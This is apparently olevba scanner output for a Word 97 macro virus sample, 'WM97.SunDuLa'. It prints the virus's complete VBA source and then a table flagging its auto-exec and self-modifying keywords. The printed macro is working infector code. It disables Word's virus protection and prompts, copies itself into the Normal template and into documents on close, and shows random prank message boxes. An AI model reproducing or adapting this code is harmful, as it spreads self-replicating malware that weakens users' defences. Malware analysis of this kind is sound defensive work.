olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sundula-92df7ca1c618e663ba3e0c7215f35821d20069e5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sundula-92df7ca1c618e663ba3e0c7215f35821d20069e5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'WM97.SunDuLa
Private Sub Document_Close()
 On Error Resume Next
 
 With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
        .ConfirmConversions = False
 End With

With Application
       .ScreenUpdating = False
       .DisplayStatusBar = False
       .DisplayAlerts = False
End With
 
 Set norm = NormalTemplate.VBProject.VBComponents(1).codemodule
 Set doc = ActiveDocument.VBProject.VBComponents(1).codemodule
    
    If norm.Lines(1, 1) <> "'WM97.SunDuLa" Then
        norm.DeleteLines 1, norm.CountOfLines
        norm.InsertLines 1, doc.Lines(1, doc.CountOfLines)
        norm.replaceline 70, "Sub ViewVBcode()"
        ElseIf doc.Lines(1, 1) <> "'WM97.SunDuLa" Then
        doc.DeleteLines 1, doc.CountOfLines
        doc.InsertLines 1, norm.Lines(1, norm.CountOfLines)
        doc.replaceline 70, "Sub Toolsmacro()"
    End If

Randomize
If Int(Rnd * 12) = 2 Then
Application.EnableCancelKey = wdCancelDisabled
ShowVisualBasicEditor = False
Dim RandomNumber As Integer
RandomNumber = Int((Val(14) * Rnd) + 1)
Select Case RandomNumber
Case 1
MsgBox "Squirrels have fluffy tails!!", vbInformation, "Did you know?"
Case 2
MsgBox "Baboons have red butts!!", vbInformation, "Did you know?"
Case 3
MsgBox "Cows sleep standing up!!", vbInformation, "Did you know?"
Case 4
MsgBox "The average penis is 6 inchs long!!", vbInformation, "Did you know?"
Case 5
MsgBox "The average vagina is 9 inchs deep!!", vbInformation, "Did you know?"
Case 6
MsgBox "Flying squirrels don't fly they glide!!", vbInformation, "Did you know?"
Case 7
MsgBox "Life sucks!!", vbInformation, "Did you know?"
Case 8
MsgBox "Vampires are not real!!", vbInformation, "Did you know?"
Case 9
MsgBox "Werewolfs are not real!!", vbInformation, "Did you know?"
Case 10
MsgBox "The most dangerous wild animal is a deer!!", vbInformation, "Did you know"
Case 11
MsgBox "The platypus is the only mammal that lays eggs!!", vbInformation, "Did you know?"
Case 12
MsgBox "Flys live for about two days!!", vbInformation, "Did you know?"
Case 13
MsgBox "Turtles have shells!!", vbInformation, "Did you know?"
Case 14
MsgBox "Fish live in water!!", vbInformation, "Did you know?"
Case 15
MsgBox "You are infected with WM97.SunDuLa!!", vbInformation, "Did you know?"
End Select
End If
End Sub
Sub ViewVBcode()
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

